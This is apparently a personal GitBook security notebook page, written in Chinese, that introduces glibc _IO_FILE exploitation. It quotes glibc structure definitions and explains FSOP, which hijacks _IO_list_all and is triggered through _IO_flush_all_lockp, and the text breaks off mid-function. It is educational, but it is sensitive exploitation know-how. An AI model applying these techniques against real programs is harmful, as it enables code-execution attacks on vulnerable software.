
<!DOCTYPE HTML>
<html lang="en" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>Glibc _IO_FILE Exploitation Introduction Â· FA1C4 PATHs</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        <meta name="author" content="fa1c4">
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-toggle-chapters/toggle.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-katex/katex.min.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-theme-comscore/test.css">
                
            
        

    

    
        
        <link rel="stylesheet" href="../styles/website.css">
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="../reverse/" />
    
    
    <link rel="prev" href="./" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../papers/">
            
                <a href="../papers/">
            
                    
                    Papers
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1" data-path="../papers/SoK_Prudent_Evaluation_Practices_for_Fuzzing.html">
            
                <a href="../papers/SoK_Prudent_Evaluation_Practices_for_Fuzzing.html">
            
                    
                    SoK: Prudent Evaluation Practices for Fuzzing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2" data-path="../papers/FOX.html">
            
                <a href="../papers/FOX.html">
            
                    
                    FOX: Coverage-guided Fuzzing as Online Stochastic Control
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.3" data-path="../papers/On_Understanding.html">
            
                <a href="../papers/On_Understanding.html">
            
                    
                    On Understanding and Forecasting Fuzzers Performance with Static Analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4" data-path="../papers/autofz.html">
            
                <a href="../papers/autofz.html">
            
                    
                    autofz: Automated Fuzzer Composition at Runtime
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.5" data-path="../papers/Fuzz_to_the_Future.html">
            
                <a href="../papers/Fuzz_to_the_Future.html">
            
                    
                    Fuzz to the Future: Uncovering Occluded Future Vulnerabilities via Robust Fuzzing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.6" data-path="../papers/DSFuzz.html">
            
                <a href="../papers/DSFuzz.html">
            
                    
                    DSFuzz: Detecting Deep State Bugs with Dependent State Exploration
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.7" data-path="../papers/Rubick.html">
            
                <a href="../papers/Rubick.html">
            
                    
                    Automata-Guided Control-Flow-Sensitive Fuzz Driver Generation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.8" data-path="../papers/Fuzz4All.html">
            
                <a href="../papers/Fuzz4All.html">
            
                    
                    Fuzz4All: Universal Fuzzing with Large Language Models
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.9" data-path="../papers/kag.html">
            
                <a href="../papers/kag.html">
            
                    
                    KAG: Boosting LLMs in Professional Domains via Knowledge Augmented Generation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.10" data-path="../papers/graphuzz.html">
            
                <a href="../papers/graphuzz.html">
            
                    
                    Graphuzz: Data-driven Seed Scheduling for Coverage-guided Greybox Fuzzing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.11" data-path="../papers/Seed_Selection.html">
            
                <a href="../papers/Seed_Selection.html">
            
                    
                    Seed Selection for Successful Fuzzing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.12" data-path="../papers/belieffuzz.html">
            
                <a href="../papers/belieffuzz.html">
            
                    
                    Balance Seed Scheduling via Monte Carlo Planning
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.13" data-path="../papers/K_Scheduler.html">
            
                <a href="../papers/K_Scheduler.html">
            
                    
                    Effective Seed Scheduling for Fuzzing with Graph Centrality Analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.14" data-path="../papers/entropic.html">
            
                <a href="../papers/entropic.html">
            
                    
                    Boosting Fuzzer Efficiency: An Information Theoretic Perspective
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.15" data-path="../papers/FuzzInMem.html">
            
                <a href="../papers/FuzzInMem.html">
            
                    
                    FuzzInMem: Fuzzing Programs via In-memory Structures
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.16" data-path="../papers/AFLpp.html">
            
                <a href="../papers/AFLpp.html">
            
                    
                    AFL++: Combining Incremental Steps of Fuzzing Research
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.17" data-path="../papers/DDFuzz.html">
            
                <a href="../papers/DDFuzz.html">
            
                    
                    Fuzzing with Data Dependency Information
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.18" data-path="../papers/Hier.html">
            
                <a href="../papers/Hier.html">
            
                    
                    Reinforcement Learning-based Hierarchical Seed Scheduling for Greybox Fuzzing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.19" data-path="../papers/LLM_Fuzzing_BusyBox.html">
            
                <a href="../papers/LLM_Fuzzing_BusyBox.html">
            
                    
                    Fuzzing BusyBox: Leveraging LLM and Crash Reuse for Embedded Bug Unearthing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.20" data-path="../papers/llm2vec.html">
            
                <a href="../papers/llm2vec.html">
            
                    
                    LLM2Vec: Large Language Models Are Secretly Powerful Text Encoders
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.21" data-path="../papers/ShapFuzz.html">
            
                <a href="../papers/ShapFuzz.html">
            
                    
                    SHAPFUZZ: Efficient Fuzzing via Shapley-Guided Byte Selection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.22" data-path="../papers/TortoiseFuzz.html">
            
                <a href="../papers/TortoiseFuzz.html">
            
                    
                    Not All Coverage Measurements Are Equal: Fuzzing by Coverage Accounting for Input Prioritization
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.23" data-path="../papers/prefix_guided_execution.html">
            
                <a href="../papers/prefix_guided_execution.html">
            
                    
                    Accelerating Fuzzing through Prefix-Guided Execution
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.24" data-path="../papers/Fuzztastic.html">
            
                <a href="../papers/Fuzztastic.html">
            
                    
                    Extrapolating Coverage Rate in Greybox Fuzzing
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="2.1" data-path="../linux/">
            
                <a href="../linux/">
            
                    
                    Linux
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1" data-path="../linux/rust_elementary_I.html">
            
                <a href="../linux/rust_elementary_I.html">
            
                    
                    Rust Elementary I
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.2" data-path="../linux/rust_elementary_II.html">
            
                <a href="../linux/rust_elementary_II.html">
            
                    
                    Rust Elementary II
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3" data-path="../linux/rust_elementary_III.html">
            
                <a href="../linux/rust_elementary_III.html">
            
                    
                    Rust Elementary III
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.4" data-path="../linux/rust_elementary_IV.html">
            
                <a href="../linux/rust_elementary_IV.html">
            
                    
                    Rust Elementary IV
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.5" data-path="../linux/rust_elementary_V.html">
            
                <a href="../linux/rust_elementary_V.html">
            
                    
                    Rust Elementary V
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.6" data-path="../linux/rust_elementary_VI.html">
            
                <a href="../linux/rust_elementary_VI.html">
            
                    
                    Rust Elementary VI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.7" data-path="../linux/docker_sources_switch.html">
            
                <a href="../linux/docker_sources_switch.html">
            
                    
                    Docker Sources Switch
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="3.1" data-path="../fuzzing/">
            
                <a href="../fuzzing/">
            
                    
                    Fuzzing
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.1.1" data-path="../fuzzing/AFLpp_build_on_Magma.html">
            
                <a href="../fuzzing/AFLpp_build_on_Magma.html">
            
                    
                    AFLpp build for Magma
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.2" data-path="../fuzzing/fuzzbench_build.html">
            
                <a href="../fuzzing/fuzzbench_build.html">
            
                    
                    FuzzBench Build
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.3" data-path="../fuzzing/fuzzbench_new_fuzzer.html">
            
                <a href="../fuzzing/fuzzbench_new_fuzzer.html">
            
                    
                    Fuzzbench new Fuzzer
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.4" data-path="../fuzzing/aflpp_src_reading_I.html">
            
                <a href="../fuzzing/aflpp_src_reading_I.html">
            
                    
                    AFLpp Src Reading I - History
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.5" data-path="../fuzzing/aflpp_src_reading_II.html">
            
                <a href="../fuzzing/aflpp_src_reading_II.html">
            
                    
                    AFLpp Src Reading II - Forkserver
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.6" data-path="../fuzzing/aflpp_new_test.html">
            
                <a href="../fuzzing/aflpp_new_test.html">
            
                    
                    AFL++ Add New Test
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="4.1" data-path="./">
            
                <a href="./">
            
                    
                    Pwn
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter active" data-level="4.1.1" data-path="glibc_IO_FILE_exploitation.html">
            
                <a href="glibc_IO_FILE_exploitation.html">
            
                    
                    Glibc _IO_FILE Exploitation Introduction
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="5.1" data-path="../reverse/">
            
                <a href="../reverse/">
            
                    
                    Reverse
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="5.1.1" data-path="../reverse/IDAPro_cheatsheet_7x.html">
            
                <a href="../reverse/IDAPro_cheatsheet_7x.html">
            
                    
                    IDAPro Cheat Sheet 7.7
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="6.1" data-path="../theory/">
            
                <a href="../theory/">
            
                    
                    Theory
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.1.1" data-path="../theory/prac_statistics.html">
            
                <a href="../theory/prac_statistics.html">
            
                    
                    Practical Statistics
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="7.1" data-path="../LLM/">
            
                <a href="../LLM/">
            
                    
                    LLM
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="8.1" data-path="../shell/">
            
                <a href="../shell/">
            
                    
                    Shell
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="8.1.1" data-path="../shell/shell_programming_basic.html">
            
                <a href="../shell/shell_programming_basic.html">
            
                    
                    shell programming basic
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="8.1.2" data-path="../shell/shell_programming_techs_I.html">
            
                <a href="../shell/shell_programming_techs_I.html">
            
                    
                    shell programming techs I
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >Glibc _IO_FILE Exploitation Introduction</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="glibc-iofile-exploitation">Glibc _IO_FILE Exploitation</h1>
<p>&#x5728;&#x65E7;&#x7248;&#x7684; glibc &#x4E2D;&#xFF0C;<code>hook</code> &#x51FD;&#x6570;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x901A;&#x8FC7;&#x4FEE;&#x6539;&#x7279;&#x5B9A;&#x7684;&#x7B26;&#x53F7;&#xFF08;&#x5982; <code>__malloc_hook</code>, <code>__free_hook</code> &#x7B49;&#xFF09;&#x6765;&#x62E6;&#x622A;&#x548C;&#x5B9A;&#x5236; <code>malloc</code>, <code>free</code> &#x7B49;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x51FD;&#x6570;&#x7684;&#x884C;&#x4E3A;&#x3002;&#x8FD9;&#x79CD;&#x673A;&#x5236;&#x901A;&#x5E38;&#x7528;&#x4E8E;&#x5B9E;&#x73B0;&#x81EA;&#x5B9A;&#x4E49;&#x5185;&#x5B58;&#x5206;&#x914D;&#x5668;&#x3001;&#x8C03;&#x8BD5;&#x5DE5;&#x5177;&#x6216;&#x5176;&#x4ED6;&#x9AD8;&#x7EA7;&#x529F;&#x80FD;&#x3002; </p>
<p>&#x4F46;&#x4ECE;Glibc 2.34&#x5F00;&#x59CB;&#xFF0C;<code>hook</code>&#x88AB;&#x79FB;&#x9664;&#xFF0C;&#x5F00;&#x53D1;&#x8005;&#x5DF2;&#x7ECF;&#x6709;&#x4E86;&#x66F4;&#x597D;&#x7684;&#x65B9;&#x6CD5;&#x6765;&#x5B9A;&#x5236;&#x5185;&#x5B58;&#x5206;&#x914D;&#x884C;&#x4E3A;&#xFF0C;&#x5982;&#x901A;&#x8FC7; <code>malloc</code> &#x76F8;&#x5173;&#x7684; API&#xFF0C;&#x6216;&#x8005;&#x901A;&#x8FC7; <code>LD_PRELOAD</code> &#x6765;&#x66FF;&#x6362;&#x51FD;&#x6570;&#x3002;&#x4E0D;&#x8FC7;&#xFF0C;&#x8FD9;&#x4F7F;&#x5F97; glibc &#x4E0A;&#x7684;&#x5229;&#x7528;&#x53D8;&#x5F97;&#x66F4;&#x52A0;&#x590D;&#x6742;&#xFF0C;&#x539F;&#x672C;&#x901A;&#x8FC7;&#x6253;<code>__free_hook</code>&#x7B49;&#x51FD;&#x6570;&#x6765; get shell &#x7684;&#x5229;&#x7528;&#x94FE;&#x5C31;&#x5931;&#x6548;&#x4E86;&#x3002;&#x4F46;&#x653B;&#x9632;&#x662F;&#x6C38;&#x8FDC;&#x5728;&#x8FED;&#x4EE3;&#x7684;&#xFF0C;&#x6253; <code>_IO_FILE</code> &#x7ED3;&#x6784;&#x4F53;&#x7684;&#x5229;&#x7528;&#x94FE;&#x5C31;&#x56E0;&#x6B64;&#x53D8;&#x5F97;&#x76DB;&#x884C;&#x8D77;&#x6765; (2022+)&#x3002;&#x672C;&#x7BC7;&#x4E3B;&#x8981;&#x7814;&#x7A76;&#x548C;&#x603B;&#x7ED3;&#xFF0C;&#x4F5C;&#x4E3A;&#x5F53;&#x524D;&#x7248;&#x672C;&#x7684;&#x7528;&#x6237;&#x6001; HEAP &#x4E3B;&#x6D41;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x94FE;&#x7684;&#x6838;&#x5FC3;&#x4E4B;&#x4E00;&#x7684; <code>_IO_FILE</code> &#x7684;&#x5229;&#x7528;&#x65B9;&#x6CD5;&#x3002;</p>
<h2 id="source-code">Source Code</h2>
<p>&#x9605;&#x8BFB;&#x6E90;&#x7801;&#x662F;&#x6700;&#x6838;&#x5FC3;&#x7684;&#x80FD;&#x529B;&#xFF1A;<a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/bits/types/struct_FILE.h#L35" target="_blank">Glibc-2.35 _IO_FILE</a> <sup>[1]</sup> </p>
<p><code>_IO_FILE</code> &#x7684;&#x5B9A;&#x4E49;&#xFF0C;&#x5176;&#x4E2D;_IO_read(write|buf)_ptr(base|end)&#x603B;&#x5171;8&#x4E2A;&#x6307;&#x9488;&#xFF0C;&#x7528;&#x6765;&#x63A7;&#x5236;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x7F13;&#x51B2;&#x533A;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x662F;IO&#x8FC7;&#x7A0B;&#x5FC5;&#x4E0D;&#x53EF;&#x5C11;&#x7684;&#x63A7;&#x5236;&#x6307;&#x9488;&#x3002;</p>
<pre><code class="lang-c"><span class="hljs-keyword">struct</span> _IO_FILE
{
  <span class="hljs-keyword">int</span> _flags;        <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span>

  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span class="hljs-keyword">char</span> *_IO_read_ptr;    <span class="hljs-comment">/* Current read pointer */</span> 
  <span class="hljs-keyword">char</span> *_IO_read_end;    <span class="hljs-comment">/* End of get area. */</span>
  <span class="hljs-keyword">char</span> *_IO_read_base;    <span class="hljs-comment">/* Start of putback+get area. */</span>
  <span class="hljs-keyword">char</span> *_IO_write_base;    <span class="hljs-comment">/* Start of put area. */</span>
  <span class="hljs-keyword">char</span> *_IO_write_ptr;    <span class="hljs-comment">/* Current put pointer. */</span>
  <span class="hljs-keyword">char</span> *_IO_write_end;    <span class="hljs-comment">/* End of put area. */</span>
  <span class="hljs-keyword">char</span> *_IO_buf_base;    <span class="hljs-comment">/* Start of reserve area. */</span>
  <span class="hljs-keyword">char</span> *_IO_buf_end;    <span class="hljs-comment">/* End of reserve area. */</span>

  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span>
  <span class="hljs-keyword">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span>
  <span class="hljs-keyword">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span>
  <span class="hljs-keyword">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span>

  <span class="hljs-keyword">struct</span> _IO_marker *_markers;

  <span class="hljs-keyword">struct</span> _IO_FILE *_chain;

  <span class="hljs-keyword">int</span> _fileno;
  <span class="hljs-keyword">int</span> _flags2;
  <span class="hljs-keyword">__off_t</span> _old_offset; <span class="hljs-comment">/* This used to be _offset but it&apos;s too small.  */</span>

  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> _cur_column;
  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">char</span> _vtable_offset;
  <span class="hljs-keyword">char</span> _shortbuf[<span class="hljs-number">1</span>];

  _IO_lock_t *_lock;
<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span>
};
</code></pre>
<p><code>_IO_FILE_complete</code> &#x7684;&#x5B9A;&#x4E49;</p>
<pre><code class="lang-c"><span class="hljs-keyword">struct</span> _IO_FILE_complete
{
  <span class="hljs-keyword">struct</span> _IO_FILE _file;
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
  <span class="hljs-keyword">__off64_t</span> _offset;
  <span class="hljs-comment">/* Wide character stream stuff.  */</span>
  <span class="hljs-keyword">struct</span> _IO_codecvt *_codecvt;
  <span class="hljs-keyword">struct</span> _IO_wide_data *_wide_data;
  <span class="hljs-keyword">struct</span> _IO_FILE *_freeres_list;
  <span class="hljs-keyword">void</span> *_freeres_buf;
  <span class="hljs-keyword">size_t</span> __pad5;
  <span class="hljs-keyword">int</span> _mode;
  <span class="hljs-comment">/* Make sure we don&apos;t get into trouble again.  */</span>
  <span class="hljs-keyword">char</span> _unused2[<span class="hljs-number">15</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">int</span>) - <span class="hljs-number">4</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">void</span> *) - <span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">size_t</span>)];
};
</code></pre>
<p><code>_IO_FILE_plus</code> &#x548C; <code>_IO_jump_t</code> &#x7684;&#x5B9A;&#x4E49;&#xFF0C;&#x5176;&#x4E2D;&#x6BCF;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x4F5C;&#x7528;&#x5199;&#x5728;&#x4EE3;&#x7801;&#x7684;&#x6CE8;&#x91CA;&#x90E8;&#x5206; <sup>[2]</sup></p>
<pre><code class="lang-c"><span class="hljs-keyword">struct</span> _IO_jump_t
{
    JUMP_FIELD(<span class="hljs-keyword">size_t</span>, __dummy); <span class="hljs-comment">// 1</span>
    JUMP_FIELD(<span class="hljs-keyword">size_t</span>, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish); <span class="hljs-comment">// &#x6E05;&#x7A7A;&#x6240;&#x6709;&#x7F13;&#x51B2;&#x533A;&#xFF0C;&#x5173;&#x95ED;&#xFF08;close&#xFF09;&#x6587;&#x4EF6;</span>
    JUMP_FIELD(_IO_overflow_t, __overflow); <span class="hljs-comment">// &#x5F53;&#x8F93;&#x51FA;&#x7F13;&#x51B2;&#x533A;&#x7528;&#x5B8C;&#x65F6;&#xFF0C;&#x5411;&#x786C;&#x76D8;&#x5199;&#x5165;&#x6570;&#x636E;</span>
    JUMP_FIELD(_IO_underflow_t, __underflow); <span class="hljs-comment">// &#x4ECE;&#x786C;&#x76D8;&#x4E2D;&#x8BFB;&#x53D6;&#x6570;&#x636E;&#xFF0C;&#x6BCF;&#x6B21;&#x8BFB;&#x53D6;&#x90FD;&#x662F;_IO_buf_base &#x81F3; _IO_buf_end&#x3002;&#x8BBE;&#x7F6E;_IO_read_end&#x4E3A;&#x8BFB;&#x53D6;&#x7684;&#x603B;&#x6570;</span>
    JUMP_FIELD(_IO_underflow_t, __uflow); <span class="hljs-comment">// &#x8C03;&#x7528;__underflow,&#x589E;&#x52A0;&#x68C0;&#x6D4B;&#x903B;&#x8F91;</span>
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail); <span class="hljs-comment">// &#x8BBE;&#x7F6E;&#x5B58;&#x50A8;</span>
    <span class="hljs-comment">/* showmany */</span>
    JUMP_FIELD(_IO_xsputn_t, __xsputn); <span class="hljs-comment">// &#x5C06;&#x6570;&#x636E;&#x4ECE;source&#x653E;&#x5165;&#x8F93;&#x51FA;&#x7F13;&#x51B2;&#x533A;, &#x7A0B;&#x5E8F;&#x7684;&#x8F93;&#x51FA;&#x51FD;&#x6570;&#x4E3B;&#x8981;&#x5C31;&#x662F;&#x8C03;&#x7528;&#x6B64;&#x51FD;&#x6570;</span>
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn); <span class="hljs-comment">// &#x5C06;&#x6570;&#x636E;&#x4ECE;&#x8F93;&#x5165;&#x7F13;&#x51B2;&#x533A;&#x653E;&#x5165;target, &#x7A0B;&#x5E8F;&#x7684;&#x8F93;&#x5165;&#x51FD;&#x6570;&#x4E3B;&#x8981;&#x5C31;&#x662F;&#x8C03;&#x7528;&#x6B64;&#x51FD;&#x6570;</span>
    JUMP_FIELD(_IO_seekoff_t, __seekoff); <span class="hljs-comment">// &#x8BBE;&#x7F6E;ptr&#x6307;&#x9488;</span>
    JUMP_FIELD(_IO_seekpos_t, __seekpos); <span class="hljs-comment">// &#x8C03;&#x7528;__seekoff</span>
    JUMP_FIELD(_IO_setbuf_t, __setbuf); <span class="hljs-comment">// &#x521D;&#x59CB;&#x5316;&#x5404;&#x4E2A;&#x7F13;&#x51B2;&#x533A;</span>
    JUMP_FIELD(_IO_sync_t, __sync); <span class="hljs-comment">// &#x8D1F;&#x8D23;&#x4E0E;&#x786C;&#x76D8;&#x548C;&#x7F13;&#x51B2;&#x533A;&#x4E4B;&#x95F4;&#x8FDB;&#x884C;&#x540C;&#x6B65;</span>
    JUMP_FIELD(_IO_doallocate_t, __doallocate); <span class="hljs-comment">// &#x7533;&#x8BF7;&#x7F13;&#x51B2;&#x533A;&#x5E76;&#x521D;&#x59CB;&#x5316;</span>
    JUMP_FIELD(_IO_read_t, __read); <span class="hljs-comment">// &#x6700;&#x7EC8;&#x8F93;&#x5165;, &#x5C01;&#x88C5;&#x7684;syscall_read</span>
    JUMP_FIELD(_IO_write_t, __write); <span class="hljs-comment">// &#x6700;&#x7EC8;&#x8F93;&#x51FA;, &#x5C01;&#x88C5;&#x7684;syscall_write</span>
    JUMP_FIELD(_IO_seek_t, __seek); <span class="hljs-comment">// &#x8C03;&#x7528;__lseek64</span>
    JUMP_FIELD(_IO_close_t, __close); <span class="hljs-comment">// &#x5173;&#x95ED;&#x6587;&#x4EF6;</span>
    JUMP_FIELD(_IO_stat_t, __stat); <span class="hljs-comment">// &#x83B7;&#x53D6;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x7684;&#x72B6;&#x6001;, &#x8C03;&#x7528;__fxstat64</span>
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc); <span class="hljs-comment">// &#x65E0;&#x7528;, &#x8FD4;&#x56DE;-1</span>
    JUMP_FIELD(_IO_imbue_t, __imbue); <span class="hljs-comment">// 21</span>
};

<span class="hljs-comment">/* We always allocate an extra word following an _IO_FILE.
   This contains a pointer to the function jump table used.
   This is for compatibility with C++ streambuf; the word can
   be used to smash to a pointer to a virtual function table. */</span>

<span class="hljs-keyword">struct</span> _IO_FILE_plus
{
  FILE file;
  <span class="hljs-keyword">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable;
};
</code></pre>
<h2 id="file-stream-oriented-programming-fsop">File Stream Oriented Programming (FSOP)</h2>
<p>&#x8FDB;&#x7A0B;&#x5185;&#x6240;&#x6709;&#x7684; _IO_FILE &#x7ED3;&#x6784;&#x4F1A;&#x4F7F;&#x7528; _chain &#x57DF;&#x76F8;&#x4E92;&#x8FDE;&#x63A5;&#x5F62;&#x6210;&#x4E00;&#x4E2A;&#x94FE;&#x8868;&#xFF0C;&#x8FD9;&#x4E2A;&#x94FE;&#x8868;&#x7684;&#x5934;&#x90E8;&#x7531;_IO_list_all &#x7EF4;&#x62A4;&#x3002;FSOP &#x7684;&#x6838;&#x5FC3;&#x601D;&#x60F3;&#x5C31;&#x662F;&#x52AB;&#x6301; _IO_list_all &#x7684;&#x503C;&#x6765;&#x4F2A;&#x9020;&#x94FE;&#x8868;&#x548C;&#x5176;&#x4E2D;&#x7684; _IO_FILE &#x9879;&#xFF0C;&#x4F46;&#x662F;&#x8FD8;&#x9700;&#x8981;&#x67D0;&#x79CD;&#x65B9;&#x6CD5;&#x8FDB;&#x884C;&#x89E6;&#x53D1;&#x3002;FSOP &#x9009;&#x62E9;&#x7684;&#x89E6;&#x53D1;&#x65B9;&#x6CD5;&#x662F;&#x8C03;&#x7528; <code>_IO_flush_all_lockp</code>. </p>
<p><code>_IO_flush_all_lockp</code> &#x5728;&#x4E09;&#x79CD;&#x60C5;&#x51B5;&#x4F1A;&#x81EA;&#x52A8;&#x8C03;&#x7528;</p>
<blockquote>
<ol>
<li>&#x5F53; libc &#x6267;&#x884C; abort &#x6D41;&#x7A0B;&#x65F6;</li>
<li>&#x5F53;&#x6267;&#x884C; exit &#x51FD;&#x6570;&#x65F6;</li>
<li>&#x5F53;&#x6267;&#x884C;&#x6D41;&#x4ECE; main &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x65F6;</li>
</ol>
</blockquote>
<p>&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x4F1A;&#x5237;&#x65B0; _IO_list_all &#x94FE;&#x8868;&#x4E2D;&#x6240;&#x6709;&#x9879;&#x7684;&#x6587;&#x4EF6;&#x6D41;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x5BF9;&#x6BCF;&#x4E2A; FILE &#x8C03;&#x7528; fflush&#xFF0C;&#x4E5F;&#x5BF9;&#x5E94;&#x4F1A;&#x8C03;&#x7528; <code>_IO_FILE_plus.vtable</code> &#x4E2D;&#x7684; <code>_IO_overflow</code>&#x3002;</p>
<pre><code class="lang-c"><span class="hljs-keyword">int</span> _IO_flush_all_lockp (<span class="hljs-keyword">int</span> do_lock)
{
  <span class="hljs-keyword">int</span> result = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">struct</span> _IO_FILE *fp;
  <span class="hljs-keyword">int</span> last_stamp;

  fp = (_IO_FILE *) _IO_list_all;
  <span class="hljs-keyword">while</span> (fp != <span class="hljs-literal">NULL</span>)
    {
        ...
